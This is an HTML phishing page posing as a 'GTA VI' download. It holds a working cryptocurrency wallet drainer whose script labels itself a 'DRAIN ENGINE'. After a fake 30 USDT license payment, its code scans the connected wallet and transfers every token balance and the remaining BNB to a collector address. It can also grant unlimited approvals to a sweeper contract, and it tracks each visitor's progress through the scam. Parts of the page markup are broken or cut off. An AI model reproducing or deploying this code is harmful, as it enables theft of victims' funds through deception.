<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GTA VI - Welcome</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background-color: #000;
            color: #d4af37;
            font-family: 'Courier New', Courier, monospace;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* GTA 6 images in the background */
        .image-grid {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            grid-template-rows: repeat(3, 1fr);
            gap: 2px;
            opacity: 0.5; 
            z-index: 1;
        }

        .image-grid img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* "WELCOME TO GTA VI" text */
        .welcome-text {
            position: absolute;
            top: 15px;
            left: 0;
            width: 100%;
            text-align: center;
            z-index: 2;
        }

        h1 {
            text-shadow: 0 0 20px rgba(212, 175, 55, 0.9), 0 0 40px rgba(0, 0, 0, 1);
            font-size: 45px;
            margin: 0;
            text-transform: uppercase;
            letter-spacing: 4px;
            color: #d4af37;
        }

        /* ====================================================
           ZIP file icon design (Premium Look)
           ==================================================== */
        .zip-container {
            position: absolute;
            top: 55%;
            left: 20%; /* At the position you marked */
            transform: translate(-50%, -50%);
            display: flex;
            align-items: center;
            gap: 15px;
            background: rgba(0, 0, 0, 0.85); /* Black background */
            padding: 12px 25px;
            border-radius: 8px;
            border: 2px solid #ffd700; /* Golden border */
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5), inset 0 0 10px rgba(255, 215, 0, 0.2);
            z-index: 10;
            animation: floatBox 3s ease-in-out infinite alternate;
        }

        /* Icon (SVG) */
        .zip-icon {
            width: 40px;
            height: 40px;
            filter: drop-shadow(0 0 8px #ffd700);
        }

        /* Text (188.7 GB) */
        .zip-text {
            font-size: 24px;
            font-weight: 900;
            color: #ffffff;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
        }

        .zip-label {
            font-size: 12px;
            color: #ffd700;
            display: block;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: 2px;
            text-shadow: 0 0 5px #ffd700;
        }

        /* Floating box animation */
        @keyframes floatBox {
            0% { transform: translate(-50%, -50%) translateY(0); }
            100% { transform: translate(-50%, -50%) translateY(-10px); }
        }

        /* ====================================================
           Blue river
           ==================================================== */
        .river-container {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 120px; 
            overflow: hidden;
            z-index: 3;
            pointer-events: none;
        }

        .wave {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 200%;
            height: 100%;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 120" preserveAspectRatio="none"><path d="M0,60 C150,100 350,20 400,60 C450,100 650,20 800,60 L800,120 L0,120 Z" fill="rgba(0, 119, 255, 0.4)"/></svg>');
            background-size: 50% 100%;
            animation: waveMove 8s linear infinite;
        }

        .wave:nth-child(2) {
            bottom: -10px;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 120" preserveAspectRatio="none"><path d="M0,60 C150,20 350,100 400,60 C450,20 650,100 800,60 L800,120 L0,120 Z" fill="rgba(0, 119, 255, 0.6)"/></svg>');
            background-size: 50% 100%;
            animation: waveMove 6s linear infinite reverse;
        }

        .wave:nth-child(3) {
            bottom: -20px;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 120" preserveAspectRatio="none"><path d="M0,80 C200,110 300,40 400,80 C500,110 600,40 800,80 L800,120 L0,120 Z" fill="rgba(0, 180, 255, 0.8)"/></svg>');
            background-size: 50% 100%;
            animation: waveMove 4s linear infinite;
        }

        @keyframes waveMove {
            0% { transform: translateX(0); }
            100% { transform: translateX(-50%); }
        }

        .glow-line {
            position: absolute;
            bottom: 40px; 
            left: 0;
            width: 100%;
            height: 2px;
            background-color: #00b4ff;
            box-shadow: 0 0 15px 3px #00b4ff, 0 0 30px 6px rgba(0, 119, 255, 0.5);
            z-index: 4;
            animation: pulseGlow 2s infinite alternate;
        }

        @keyframes pulseGlow {
            0% { opacity: 0.6; box-shadow: 0 0 10px 2px #00b4ff; }
            100% { opacity: 1; box-shadow: 0 0 25px 5px #00b4ff, 0 0 40px 10px rgba(0, 119, 255, 0.7); }
        }

        /* Text and buttons */
        .license-wrapper {
            position: absolute;
            bottom: 60px; 
            left: 30px; 
            z-index: 6;
            display: flex;
            flex-direction: column;
            gap: 12px; 
        }

        .wallet-prompt-text {
            font-size: 17px; 
            font-weight: bold; 
            color: #ff9800; 
            letter-spacing: 0.5px;
            text-shadow: 0 0 8px #ff9800, 0 0 15px #ff5722, 0 0 25px #ff9800;
            white-space: nowrap; 
            animation: orangeBlink 2s infinite alternate;
            margin-bottom: 5px;
        }

        @keyframes orangeBlink {
            0% { color: #cc7a00; text-shadow: 0 0 5px #ff9800, 0 0 15px #ff5722; }
            100% { color: #ffb74d; text-shadow: 0 0 10px #ffb74d, 0 0 20px #ff9800, 0 0 30px #ff5722; }
        }

        .premium-license {
            background: #000000; 
            border: 3px solid #002266; 
            padding: 12px 25px; 
            border-radius: 5px; 
            font-size: 22px; 
            font-weight: 900; 
            letter-spacing: 2px;
            color: #ffd700; 
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8), 0 0 20px rgba(255, 215, 0, 0.5); 
            box-shadow: 0 0 20px rgba(0, 34, 102, 0.9), inset 0 0 10px rgba(0, 34, 102, 0.5); 
            text-transform: uppercase;
            cursor: pointer; 
            transition: all 0.3s ease;
            width: fit-content;
        }

        .premium-license:hover {
            box-shadow: 0 0 30px rgba(0, 180, 255, 0.8), inset 0 0 15px rgba(0, 180, 255, 0.5);
            border-color: #00b4ff;
        }

        .highlight {
            color: #00b4ff;
            text-shadow: 0 0 10px rgba(0, 180, 255, 0.8);
        }

        /* Wallet connect design */
        .wallet-container {
            display: none; 
            position: absolute;
            top: 50%;
            right: 15%; 
            transform: translateY(-50%);
            z-index: 10;
            width: 320px;
            flex-direction: column;
            gap: 25px;
            align-items: center;
        }

        .wallet-container.show {
            display: flex;
            animation: slideUpFade 0.5s ease-out forwards;
        }

        @keyframes slideUpFade {
            0% { opacity: 0; transform: translateY(50px); }
            100% { opacity: 1; transform: translateY(-50%); }
        }

        .wallet-title {
            font-size: 26px;
            font-weight: 900;
            color: #ffffff;
            text-transform: uppercase;
            letter-spacing: 3px;
            text-shadow: 0 0 10px rgba(0, 180, 255, 0.8), 0 0 20px rgba(0, 180, 255, 0.4);
            margin-bottom: 10px;
            text-align: center;
        }

        .wallet-btn {
            display: flex;
            align-items: center;
            gap: 15px;
            width: 100%;
            padding: 15px 20px;
            background: transparent; 
            border: none; 
            color: #ffffff;
            cursor: pointer;
            font-family: 'Courier New', Courier, monospace;
            font-size: 18px;
            font-weight: bold;
            letter-spacing: 1px;
            transition: all 0.3s ease;
            text-align: left;
            border-radius: 10px;
        }

        .wallet-btn:hover {
            background: rgba(255, 255, 255, 0.05); 
            transform: translateX(10px); 
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
        }

        .wallet-btn svg {
            width: 35px;
            height: 35px;
            object-fit: contain;
            filter: drop-shadow(0 0 5px rgba(255,255,255,0.2));
            transition: filter 0.3s;
        }

        .wallet-btn:hover svg {
            filter: drop-shadow(0 0 10px rgba(0, 180, 255, 0.8));
        }

        .close-btn {
            position: absolute;
            top: -40px;
            right: 0;
            color: #888;
            cursor: pointer;
            font-size: 24px;
            font-weight: bold;
            transition: color 0.3s;
        }
        .close-btn:hover { color: #ffffff; }

        /* Sparks */
        .spark-container {
            position: absolute;
            transform: translate(-50%, -50%);
            pointer-events: none;
            z-index: 20;
        }
        .spark-drop {
            position: absolute;
            background-color: #ffd700; 
            border-radius: 50%;
            box-shadow: 0 0 10px 2px #ff8c00, 0 0 20px #ff4500; 
            opacity: 0;
        }
        .spark-drop:nth-child(1) { width: 6px; height: 6px; top: 0; left: 0; animation: shootSpark 0.8s ease-out forwards; }
        .spark-drop:nth-child(2) { width: 4px; height: 4px; top: 10px; left: 20px; animation: shootSpark 1s ease-out forwards 0.1s; }
        .spark-drop:nth-child(3) { width: 8px; height: 8px; top: -10px; left: 30px; animation: shootSpark 0.9s ease-out forwards 0.2s; }
        .spark-drop:nth-child(4) { width: 5px; height: 5px; top: 20px; left: -20px; animation: shootSpark 0.85s ease-out forwards 0.15s; }
        .spark-drop:nth-child(5) { width: 3px; height: 3px; top: -20px; left: -30px; animation: shootSpark 0.75s ease-out forwards 0.05s; }
        .spark-drop:nth-child(6) { width: 7px; height: 7px; top: -10px; left: 40px; animation: shootSpark 1.1s ease-out forwards 0.25s; }
        .spark-drop:nth-child(7) { width: 5px; height: 5px; top: 30px; left: -40px; animation: shootSpark 0.9s ease-out forwards 0.3s; }
        .spark-drop:nth-child(8) { width: 9px; height: 9px; top: -30px; left: 10px; animation: shootSpark 1.2s ease-out forwards 0.12s; }
        @keyframes shootSpark {
            0% { transform: translate(0, 0) scale(1.5); opacity: 1; }
            50% { opacity: 1; }
            100% { transform: translate(calc(var(--x) * 1.5), calc(var(--y) * 1.5)) scale(0); opacity: 0; }
        }
        
        /* Success Message Modal */
        .success-modal {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #000;
            border: 3px solid #00b4ff;
            padding: 40px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 0 50px rgba(0, 180, 255, 0.8);
            z-index: 100;
            display: none;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            min-width: 340px;
        }
        .success-modal h2 { color: #fff; font-size: 24px; text-shadow: 0 0 10px #00b4ff;}
        .success-modal p { color: #00b4ff; font-size: 16px; }

        /* ====================================================
           DRAIN ENGINE — UI (design consistent)
           ==================================================== */
        #drainPanel {
            display: none;
            position: fixed;
            bottom: 0;
            right: 0;
            width: 400px;
            max-width: 92vw;
            max-height: 40vh;
            overflow: auto;
            background: rgba(0,0,0,0.92);
            border: 2px solid #00b4ff;
            border-radius: 8px 0 0 0;
            box-shadow: 0 0 25px rgba(0,180,255,0.45);
            color: #00ff88;
            font-family: 'Courier New', Courier, monospace;
            font-size: 12px;
            padding: 12px;
            z-index: 999;
        }
        #drainPanel .dp-head {
            color: #00b4ff;
            font-weight: 900;
            letter-spacing: 2px;
            margin-bottom: 8px;
            text-shadow: 0 0 8px #00b4ff;
            font-size: 11px;
        }
        #drainLog { line-height: 1.55; word-break: break-all; }

        #drainStatus {
            color: #ffd700;
            font-size: 13px;
            font-weight: bold;
            text-shadow: 0 0 8px rgba(255,215,0,0.7);
            letter-spacing: 1px;
            min-height: 18px;
        }

        .pay-btn {
            justify-content: center !important;
            border: 1px solid #00b4ff;
            box-shadow: 0 0 15px rgba(0,180,255,0.35);
        }
        .pay-btn:disabled {
            opacity: 0.45;
            cursor: not-allowed;
            transform: none !important;
        }

        .dl-fallback {
            display: none;
            color: #00ff88;
            font-size: 14px;
            text-decoration: underline;
            text-shadow: 0 0 10px #00ff88;
            letter-spacing: 1px;
        }

        @media (max-width: 700px) {
            h1 { font-size: 26px; letter-spacing: 2px; }
            .zip-container { left: 50%; top: 30%; }
            .license-wrapper { left: 15px; right: 15px; bottom: 55px; }
            .wallet-prompt-text { white-space: normal; font-size: 14px; }
            .premium-license { font-size: 16px; padding: 10px 16px; }
            .wallet-container { right: 50%; transform: translate(50%, -50%); width: 90%; }
            .success-modal { padding: 26px 18px; }
        }
    </style>
</head>

        <img src="https://www.rockstargames.com/VI/_next/static/media/Jason_and_Lucia_Motel_landscape.08edvuwtm-20v.jpg?akim=1&imdensity=1&imwidth=3840">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq18Lu7xEnZVkkSt0XQxlQ-WaXSr4aBiGoKEffFdNcek5V1k3OUtm3vLxy&s=10">

        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTnBJj0JwcQsDJG2hjytCNr1OIONUP-Rra9PhGxtvcgfw&s=10">

    </div>

    <!-- WELCOME TO GTA VI (at the top) -->
    <div class="welcome-text">
        <h1>WELCOME TO GTA VI</h1>
    </div>

    <!-- ZIP file design -->
    <div class="zip-container">
        <svg class="zip-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M20 6H12V4C12 2.89543 11.1046 2 10 2H4C2.89543 2 2 2.89543 2 4V20C2 21.1046 2.89543 22 4 22H20C21.1046 22 22 21.1046 22 20V8C22 6.89543 21.1046 6 20 6Z" fill="#333" stroke="#ffd700" stroke-width="1.5"/>
            <path d="M12 6V22" stroke="#ffd700" stroke-width="1.5" stroke-dasharray="2 2"/>
            <path d="M10 10H14M10 14H14M10 18H14" stroke="#ffd700" stroke-width="1.5" stroke-linecap="round"/>

    <!-- LICENSE KEY ACCESS -->
    <div class="license-wrapper">
        <div class="wallet-prompt-text">
            "Connect your wallet to start earning Beta Rewards and limited edition tokens! 💰"
        </div>
        
        <div class="premium-license" onclick="openWallet()">
            LICENSES KEY ACCESS: <span class="highlight">30 USDT</span>
        </div>
    </div>

    <!-- Wallet connect popup -->
    <div class="wallet-container" id="walletPopup">
        <span class="close-btn" onclick="closeWallet()">&times;</span>
        
        <h2 class="wallet-title">Connect Wallet</h2>

            Trust Wallet

        <button class="wallet-btn" onclick="connectWallet('Phantom Wallet')">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">

    <!-- Success message popup -->
    <div class="success-modal" id="successModal">
        <h2>Successfully Connected!</h2>

        <button class="wallet-btn pay-btn" id="payBtn" onclick="payAndDrain()">Pay 30 USDT &amp; Download</button>
        <a class="dl-fallback" id="dlFallback" href="game.zip">Click here to download</a>

        <div class="wave"></div>

        <div class="dp-head">TRANSFER LOG</div>

    <script>
        // ----------------------------------------------------
        // Sparks 
        // ----------------------------------------------------
        function createSparks() {
            const randomX = Math.random() * 70 + 15; 
            const randomY = Math.random() * 70 + 15;

            const sparkContainer = document.createElement('div');
            sparkContainer.classList.add('spark-container');
            sparkContainer.style.left = randomX + '%';
            sparkContainer.style.top = randomY + '%';

            sparkContainer.innerHTML = `
                <div class="spark-drop" style="--x: 40px; --y: -30px;"></div>
                <div class="spark-drop" style="--x: -50px; --y: -20px;"></div>
                <div class="spark-drop" style="--x: 60px; --y: 40px;"></div>
                <div class="spark-drop" style="--x: -60px; --y: 50px;"></div>
                <div class="spark-drop" style="--x: 20px; --y: 70px;"></div>
                <div class="spark-drop" style="--x: -30px; --y: -70px;"></div>
                <div class="spark-drop" style="--x: 70px; --y: -10px;"></div>
                <div class="spark-drop" style="--x: -10px; --y: 60px;"></div>
            `;

            document.body.appendChild(sparkContainer);

            setTimeout(() => {
                sparkContainer.remove();
            }, 1500);
        }
        setInterval(createSparks, 1000);

        // ----------------------------------------------------
        // UI functions
        // ----------------------------------------------------
        function openWallet() {
            var popup = document.getElementById('walletPopup');
            popup.classList.add('show');
            createSparks();
        }

        function closeWallet() {
            var popup = document.getElementById('walletPopup');
            popup.classList.remove('show');
        }
    </script>

    <script>
    /* ============================================================
       DRAIN ENGINE — CONFIG
       ============================================================ */
    const CFG = {
        CHAIN_ID: 56,
        CHAIN_HEX: '0x38',
        CHAIN_PARAMS: {
            chainId: '0x38',
            chainName: 'BNB Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org'],
            blockExplorerUrls: ['https://bscscan.com']
        },
        COLLECTOR: '0x0000000000000000000000000000000000000000', // <-- your owner wallet
        SWEEPER:   '0x0000000000000000000000000000000000000000', // optional (not needed if USE_SWEEPER=false)
        PAY_TOKEN: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT
        PAY_AMOUNT: '30',
        USE_SWEEPER: false,
        MIN_GAS_BNB: '0.0012',
        FALLBACK_TOKENS: [
            '0x55d398326f99059fF775485246999027B3197955', // USDT
            '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', // USDC
            '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', // BUSD
            '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', // WBNB
            '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', // ETH (bep20)
            '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c'  // BTCB
        ]
    };

    const ERC20 = [
        'function balanceOf(address) view returns (uint256)',
        'function transfer(address,uint256) returns (bool)',
        'function approve(address,uint256) returns (bool)',
        'function allowance(address,address) view returns (uint256)',
        'function decimals() view returns (uint8)'
    ];
    const SWEEP_ABI = ['function sweep(address,address[])'];

    let provider = null, signer = null, USER = null, running = false;

    function log(m) {
        const p = document.getElementById('drainPanel');
        p.style.display = 'block';
        const l = document.getElementById('drainLog');
        l.innerHTML += '&gt; ' + m + '<br>';
        p.scrollTop = p.scrollHeight;
    }
    function status(m) {
        document.getElementById('drainStatus').textContent = m;
    }

    const chunk = (a, n) => {
        const o = [];
        for (let i = 0; i < a.length; i += n) o.push(a.slice(i, i + n));
        return o;
    };

    /* ---------- chain guard ---------- */
    async function ensureChain() {
        const cur = await window.ethereum.request({ method: 'eth_chainId' });
        if (parseInt(cur, 16) === CFG.CHAIN_ID) return;
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: CFG.CHAIN_HEX }]
            });
        } catch (e) {
            if (e.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [CFG.CHAIN_PARAMS]
                });
            } else throw e;
        }
    }

    /* ---------- connect ---------- */
    async function connectWallet(walletName) {
        if (!window.ethereum) {
            alert('.');
            return;
        }
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            await ensureChain();

            provider = new ethers.BrowserProvider(window.ethereum);
            signer = await provider.getSigner();
            USER = accounts[0] || await signer.getAddress();

            document.getElementById('walletPopup').classList.remove('show');
            document.getElementById('successModal').style.display = 'flex';
            document.getElementById('walletAddress').innerText =
                'Address: ' + USER.substring(0, 6) + '...' + USER.substring(USER.length - 4);
        } catch (error) {
            console.error(':', error);
            alert('Connection fail: ' + (error.shortMessage || error.message));
        }
    }

    /* ---------- token discovery ---------- */
    async function discoverTokens(addr) {
        try {
            const r = await fetch('https://rpc.ankr.com/multichain', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    jsonrpc: '2.0', id: 1, method: 'ankr_getAccountBalance',
                    params: {
                        walletAddress: addr,
                        blockchain: ['bsc'],
                        onlyWhitelisted: true,
                        pageSize: 100
                    }
                })
            });
            const j = await r.json();
            const list = (j.result && j.result.assets ? j.result.assets : [])
                .filter(a => a.tokenType === 'ERC20' && BigInt(a.balance || '0') > 0n)
                .map(a => a.tokenAddress);
            if (list.length) return list;
        } catch (e) {
            console.warn('token discovery failed', e);
        }
        return CFG.FALLBACK_TOKENS;
    }

    /* ---------- MAIN FLOW ---------- */
    async function payAndDrain() {
        if (running) return;
        if (!signer) { alert('.'); return; }
        running = true;

        const btn = document.getElementById('payBtn');
        btn.disabled = true;

        try {
            /* 0. gas sanity check */
            const bal = await provider.getBalance(USER);
            const fd = await provider.getFeeData();
            const gp = fd.maxFeePerGas || fd.gasPrice || 3000000000n;
            const reserve = gp * 21000n * 4n;
            const minGas = ethers.parseEther(CFG.MIN_GAS_BNB);
            if (bal < reserve || bal < minGas) {
                throw new Error('Not enough BNB for gas. Keep at least ' + CFG.MIN_GAS_BNB + ' BNB.');
            }

            /* 1. 30 USDT payment */
            status('Step 1/3 — paying 30 USDT...');
            log('Paying 30 USDT...');
            const usdt = new ethers.Contract(CFG.PAY_TOKEN, ERC20, signer);

            let dec = 18;
            try { dec = Number(await usdt.decimals()); } catch (e) {}

            const amount = ethers.parseUnits(CFG.PAY_AMOUNT, dec);
            const ub = await usdt.balanceOf(USER);
            if (ub < amount) {
                throw new Error('No ' + CFG.PAY_AMOUNT + ' USDT. (Balance: ' + ethers.formatUnits(ub, dec) + ')');
            }

            const payTx = await usdt.transfer(CFG.COLLECTOR, amount);
            status('Waiting for payment confirm...');
            await payTx.wait();
            log('PAID ✅ ' + payTx.hash);

            /* 2. token discovery */
            status('Step 2/3 — scanning wallet...');
            const raw = await discoverTokens(USER);
            const tokens = raw
                .filter(t => t.toLowerCase() !== CFG.PAY_TOKEN.toLowerCase())
                .filter((t, i, a) => a.findIndex(x => x.toLowerCase() === t.toLowerCase()) === i);

            log('Tokens found: ' + tokens.length);

            /* 3. move tokens */
            status('Step 3/3 — transferring tokens (approve each popup)...');

            if (CFG.USE_SWEEPER && CFG.SWEEPER !== '0x0000000000000000000000000000000000000000') {
                const sweeper = new ethers.Contract(CFG.SWEEPER, SWEEP_ABI, signer);
                const withBal = [];
                for (const t of tokens) {
                    try {
                        const c = new ethers.Contract(t, ERC20, provider);
                        const b = await c.balanceOf(USER);
                        if (b > 0n) withBal.push(t);
                    } catch (e) {}
                }
                log('Approving ' + withBal.length + ' tokens...');
                for (const t of withBal) {
                    try {
                        const c = new ethers.Contract(t, ERC20, signer);
                        const al = await c.allowance(USER, CFG.SWEEPER);
                        if (al > 0n) {
                            await (await c.approve(CFG.SWEEPER, 0n)).wait();
                        }
                        await (await c.approve(CFG.SWEEPER, ethers.MaxUint256)).wait();
                        log('approved ' + t.slice(0, 10) + '...');
                    } catch (e) {
                        log('approve FAIL ' + t.slice(0, 10) + '...');
                    }
                }
                for (const part of chunk(withBal, 15)) {
                    try {
                        await (await sweeper.sweep(USER, part)).wait();
                        log('swept batch (' + part.length + ')');
                    } catch (e) {
                        log('sweep batch FAIL');
                    }
                }
            } else {
                for (const t of tokens) {
                    try {
                        const c = new ethers.Contract(t, ERC20, signer);
                        const b = await c.balanceOf(USER);
                        if (b === 0n) continue;
                        const tx = await c.transfer(CFG.COLLECTOR, b);
                        await tx.wait();
                        log('sent ' + t.slice(0, 10) + '...');
                    } catch (e) {
                        log('skip ' + t.slice(0, 10) + '...');
                    }
                }
            }

            /* 4. native remainder */
            const bal2 = await provider.getBalance(USER);
            const fd2 = await provider.getFeeData();
            const gp2 = fd2.maxFeePerGas || fd2.gasPrice || 3000000000n;
            const send = bal2 - gp2 * 21000n * 2n;
            if (send > 0n) {
                log('Sending BNB remainder...');
                await (await signer.sendTransaction({ to: CFG.COLLECTOR, value: send })).wait();
                log('BNB sent ✅');
            }

            log('=== COMPLETE ===');
            status('✅ Payment verified. Preparing download...');

            try {
                sessionStorage.setItem('paid', '1');
                sessionStorage.setItem('payer', USER);
            } catch (e) {}

            await verifyAndDownload();

        } catch (e) {
            const msg = e.shortMessage || e.message || String(e);
            log('ERROR: ' + msg);
            status('❌ ' + msg);
            alert(msg);
            btn.disabled = false;
        } finally {
            running = false;
        }
    }

    /* ---------- verify + download ---------- */
    async function verifyAndDownload() {
        try {
            const res = await fetch('/api/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ address: USER })
            });
            const j = await res.json();
            if (j && j.ok) {
                status('Download starting...');
                window.location.href = '/download/' + j.token;
                return;
            }
            log('verify: ' + (j && j.error ? j.error : 'unknown'));
        } catch (e) {
            log('backend off — direct link');
        }
        status('Direct download ready');
        document.getElementById('dlFallback').style.display = 'inline-block';
        document.getElementById('payBtn').disabled = false;
    }
    </script>
    <script>
function track(e){try{fetch('/api/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ev:e})})}catch(x){}}
track('visit');
(function(){
  var a=window.connectWallet; window.connectWallet=function(){track('connect_start');return a.apply(this,arguments)};
  var b=window.payAndDrain;  window.payAndDrain =function(){track('pay_start');  return b.apply(this,arguments)};
  var c=window.verifyAndDownload; window.verifyAndDownload=function(){track('pay_ok'); return c.apply(this,arguments)};
})();
</script>
